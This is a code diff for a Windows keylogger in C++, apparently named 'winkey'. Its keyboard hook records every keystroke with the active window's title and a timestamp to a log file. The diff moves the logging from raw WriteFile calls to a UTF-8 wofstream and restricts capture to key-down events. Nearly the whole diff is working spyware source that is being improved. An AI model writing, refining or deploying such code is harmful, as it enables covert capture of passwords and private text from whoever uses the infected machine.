@@ -1,12 +1,11 @@
 #pragma warning(disable:4530 4668 4577 5045)
 
 #include <windows.h>
-#include <string.h>
-#include <string>
-#include <stdio.h>
+#include <fstream>
 
 #pragma comment(lib, "user32.lib")
 
+const std::locale utf8_locale = std::locale("en_US.UTF-8");
 TCHAR wnd_title[1024] = { 0 };
 TCHAR old_wnd_title[1024] = { 0 };
 
@@ -34,8 +33,7 @@ std::string map_keys[255] = {
 LRESULT CALLBACK KeyboardHook(int nCode, WPARAM wParam, LPARAM lParam)
 {
 	KBDLLHOOKSTRUCT* kbd_struct = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
-	HANDLE hFile;
-	DWORD dwPtr, dwPID, dwThreadID;
+	DWORD dwPID, dwThreadID;
 	int numChars;
 
 	switch (wParam) {
@@ -44,61 +42,39 @@ LRESULT CALLBACK KeyboardHook(int nCode, WPARAM wParam, LPARAM lParam)
 		HWND hForegroundProcess = GetForegroundWindow();
 		dwThreadID = GetWindowThreadProcessId(hForegroundProcess, &dwPID);
 		HKL currentLocale = GetKeyboardLayout(dwThreadID);
-		WCHAR buffer[32];
 		TCHAR log_title[1500];
 		BYTE uKeyboardState[256] = { 0 };
 		SYSTEMTIME local_time;
 
-		hFile = CreateFile(
-			TEXT("winkey.log"),
-			FILE_APPEND_DATA,
-			FILE_SHARE_READ,
-			NULL,
-			OPEN_ALWAYS,
-			FILE_ATTRIBUTE_NORMAL,
-			NULL);
+		std::wofstream log_file(L"winkey.log", std::wofstream::app);
+		log_file.imbue(utf8_locale);
 
-		if (hFile != INVALID_HANDLE_VALUE) {
-			SetFilePointer(hFile, 0, NULL, FILE_END);
+		if (log_file.is_open()) {
 			GetWindowTextA(hForegroundProcess, wnd_title, 1024);
 			if (strcmp(old_wnd_title, wnd_title) != 0) {
 				GetLocalTime(&local_time);
-				_snprintf_s(log_title, 1500, 1500, "\r\n[%02d.%02d.%04d %02d:%02d:%02d] - '%s'\r\n", local_time.wDay, local_time.wMonth, local_time.wYear, local_time.wHour, local_time.wMinute, local_time.wSecond, wnd_title);
+				_snprintf_s(log_title, 1500, 1500, "\r\n[%02d.%02d.%04d %02d:%02d:%02d] - '%s'", local_time.wDay, local_time.wMonth, local_time.wYear, local_time.wHour, local_time.wMinute, local_time.wSecond, wnd_title);
 				strcpy_s(old_wnd_title, _countof(wnd_title), wnd_title);
-				WriteFile(
-					hFile,
-					log_title,
-					strlen(log_title),
-					&dwPtr,
-					NULL);
+				log_file << log_title << std::endl;
 			}
-			char key[32] = { 0 };
 			if (strcmp(map_keys[kbd_struct->vkCode].c_str(), "--") != 0 &&
-				strcmp(map_keys[kbd_struct->vkCode].c_str(), "") != 0) {
+				strcmp(map_keys[kbd_struct->vkCode].c_str(), "") != 0 &&
+				wParam == WM_KEYDOWN) {
+				char key[32] = { 0 };
 				_snprintf_s(key, 32, 32, "[%s]", map_keys[kbd_struct->vkCode].c_str());
-				WriteFile(
-					hFile,
-					key,
-					strlen(key),
-					&dwPtr,
-					NULL);
+				log_file << key;
 			} else {
 				GetKeyState(VK_SHIFT);
 				GetKeyState(VK_MENU);
 				GetKeyboardState(uKeyboardState);
-				numChars = ToUnicodeEx(kbd_struct->vkCode, kbd_struct->scanCode, uKeyboardState, buffer, 32, 0, currentLocale);
-				if (numChars >= 1) {
-					WriteFile(
-						hFile,
-						buffer,
-						(DWORD)numChars,
-						&dwPtr,
-						NULL);
+				WCHAR buffer[8];
+				numChars = ToUnicodeEx(kbd_struct->vkCode, kbd_struct->scanCode, uKeyboardState, buffer, 8, 0, currentLocale);
+				if (numChars == 1) {
+					log_file << buffer;
 				}
 			}
 
-			CloseHandle(hFile);
-			hFile = INVALID_HANDLE_VALUE;
+			log_file.close();
 		}
 		break;
 	}
